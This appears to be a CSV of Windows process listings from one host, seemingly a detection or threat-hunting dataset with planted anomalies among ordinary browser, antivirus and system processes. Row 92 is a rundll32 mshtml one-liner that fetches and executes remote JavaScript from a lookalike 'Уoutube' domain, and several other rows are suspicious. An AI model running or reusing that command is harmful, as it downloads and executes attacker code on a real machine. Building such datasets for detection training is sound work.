,arguments,hostname,name,path,pid,username
21,"""C:\Users\iankel\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=6930244878569528683 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=6930244878569528683 --renderer-client-id=3 --mojo-platform-channel-handle=2904 /prefetch:1",0004IXGWB,opera.exe,C:\Users\iankel\AppData\Local\Programs\Opera\56.0.3051.52,4210,iankel
23,"""C:\Users\iankel\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=2685998191293934672 --lang=en-GB --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=2685998191293934672 --renderer-client-id=12 --mojo-platform-channel-handle=4360 /prefetch:1",0004IXGWB,opera.exe,C:\Users\iankel\AppData\Local\Programs\Opera\56.0.3051.52,4116,iankel
25,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",0004IXGWB,mcuicnt.exe,C:\Program Files\Common Files\mcafee\Platform,2650,darc.flore1
26,C:\Windows\system32\svchost.exe -k netsvcs,0004IXGWB,svchost.exe,C:\Windows\system32,3272,NT AUTHORITY\SYSTEM
31,"C:\WINDOWS\system32\cmd.exe /c """"C:\Ruby24-x64\bin\irb.cmd"" """,0004IXGWB,cmd.exe,C:\WINDOWS\system32,6260,iankel
32,"""LogonUI.exe"" /flags:0x0",0004IXGWB,LogonUI.exe,C:\Windows\system32,436,NT AUTHORITY\SYSTEM
33,C:\Windows\system32\svchost.exe -k DcomLaunch,0004IXGWB,svchost.exe,C:\Windows\system32,136,NT AUTHORITY\SYSTEM
34,C:\Windows\System32\svchost.exe -k utcsvc,0004IXGWB,svchost.exe,C:\Windows\System32,5936,NT AUTHORITY\SYSTEM
36,"""C:\Users\jayden.foste\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",0004IXGWB,OneDrive.exe,C:\Users\jayden.foste\AppData\Local\Microsoft\OneDrive,2687,jayden.foste
37,"""C:\Users\iankel\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=gpu-process --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --gpu-preferences=KAAAAAAAAACAAwBAAQAAAAAAAAAAAGAAAAAAAAAAAAAIAAAAAAAAACgAAAAEAAAAIAAAAAAAAAAoAAAAAAAAADAAAAAAAAAAOAAAAAAAAAAQAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAACwAAABAAAAAAAAAAAQAAAAoAAAAQAAAAAAAAAAEAAAALAAAA --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --service-request-channel-token=7207758415534163028 --mojo-platform-channel-handle=1472 --ignored="" --type=renderer "" /prefetch:2",0004IXGWB,opera.exe,C:\Users\iankel\AppData\Local\Programs\Opera\56.0.3051.52,6015,iankel
39,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",0004IXGWB,McPvTray.exe,C:\Program Files\McAfee\MAT,6287,darc.flore1
40,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",0004IXGWB,UIHost.exe,C:\Program Files\McAfee\WebAdvisor,544,darc.flore1
41,C:\Windows\System32\msdtc.exe,0004IXGWB,msdtc.exe,C:\Windows\System32,5028,NT AUTHORITY\SYSTEM
42,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",0004IXGWB,McCSPServiceHost.exe,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,6382,darc.flore1
43,C:\Windows\system32\svchost.exe -k NetworkService,0004IXGWB,svchost.exe,C:\Windows\system32,860,NT AUTHORITY\SYSTEM
44,taskhostex.exe ,0004IXGWB,taskhostex.exe,C:\Windows\system32,1600,NT AUTHORITY\SYSTEM
45,"""C:\Program Files\internet explorer\iexplore.exe"" ",0004IXGWB,iexplore.exe,C:\Program Files\internet explorer,805,iri.jone4
48,"""C:\Users\darc.flore1\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",0004IXGWB,mcafee_trial_setup_433.0207.3919_key.exe,C:\Users\darc.flore1\AppData\Local\Temp\scoped_dir9616_4071,5901,darc.flore1
49,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",0004IXGWB,MFEAvSvc.exe,C:\Program Files\McAfee\MfeAV,5122,darc.flore1
51,winlogon.exe,0004IXGWB,winlogon.exe,C:\Windows\system32,3216,NT AUTHORITY\SYSTEM
53,C:\Windows\system32\svchost.exe -k RPCSS,0004IXGWB,svchost.exe,C:\Windows\system32,5068,NT AUTHORITY\SYSTEM
55,C:\Windows\System32\svchost.exe -k termsvcs,0004IXGWB,svchost.exe,C:\Windows\System32,2608,NT AUTHORITY\SYSTEM
56,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,0004IXGWB,svchost.exe,C:\Windows\System32,1968,NT AUTHORITY\SYSTEM
58,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Get-Date,0004IXGWB,powershell.exe,C:\Windows\System32\powershell.exe,4420,nicbell76
59,C:\Windows\Explorer.EXE,0004IXGWB,Explorer.EXE,C:\Windows,1116,NT AUTHORITY\SYSTEM
60,C:\Windows\system32\lsass.exe,0004IXGWB,lsass.exe,C:\Windows\system32,3624,NT AUTHORITY\SYSTEM
61,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,0004IXGWB,McDiReg.exe,C:\ProgramData\McAfee\Direct,1496,darc.flore1
62,,0004IXGWB,Narrator.exe,C:\Windows\System32\Narrator.exe,1844,NT AUTHORITY\SYSTEM
63,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",0004IXGWB,modulecoreservice.exe,c:\program files\common files\mcafee\modulecore,4894,darc.flore1
68,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",0004IXGWB,MMSSHOST.EXE,C:\Program Files\Common Files\McAfee\MMSSHost,6381,darc.flore1
69,C:\Windows\System32\svchost.exe -k csrsvs,0004IXGWB,svchost.exe,C:\Windows\System32\svchost.exe,2048,iri.jone4
70,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",0004IXGWB,McApExe.exe,C:\Program Files\Common Files\McAfee\VSCore_18_6,636,darc.flore1
74,"C:\Users\iankel\AppData\Local\Programs\Opera\56.0.3051.52\opera_crashreporter.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\iankel\AppData\Roaming\Opera Software\Opera Stable\Crash Reports"" ""--crash-count-file=C:\Users\iankel\AppData\Roaming\Opera Software\Opera Stable\crash_count.txt"" --url=https://crashstats-collector.opera.com/collector/submit --annotation=channel=Stable --annotation=plat=Win64 --annotation=prod=OperaDesktop --annotation=ver=56.0.3051.52 --initial-client-data=0x238 0x304 0x30c 0x320 0x308 0x7ffb51313108 0x7ffb51313118 0x7ffb51313128",0004IXGWB,opera_crashreporter.exe,C:\Users\iankel\AppData\Local\Programs\Opera\56.0.3051.52,2981,iankel
77,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",0004IXGWB,ServiceHost.exe,C:\Program Files\McAfee\WebAdvisor,2067,darc.flore1
79,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",0004IXGWB,mchost.exe,C:\Program Files\Common Files\McAfee\Platform\Core,5256,darc.flore1
84,"""C:\Users\iankel\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --start-maximized --ran-launcher",0004IXGWB,opera.exe,C:\Users\iankel\AppData\Local\Programs\Opera\56.0.3051.52,1353,iankel
85,C:\Windows\system32\wbem\wmiprvse.exe,0004IXGWB,wmiprvse.exe,C:\Windows\system32\wbem,292,NT AUTHORITY\SYSTEM
92,"C:\Windows\System32\rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:\http://www.Уoutube.org/19w1.js'"").Exec();""",0004IXGWB,rundll32.exe,C:\Windows\System32\rundll32.exe,2664,jasmin.washin
94,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",0004IXGWB,McAMTaskAgent.exe,C:\Program Files\Common Files\McAfee\TaskScheduler,4027,darc.flore1
106,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",0004IXGWB,ProtectedModuleHost.exe,C:\Program Files\Common Files\McAfee\ModuleCore,4004,darc.flore1
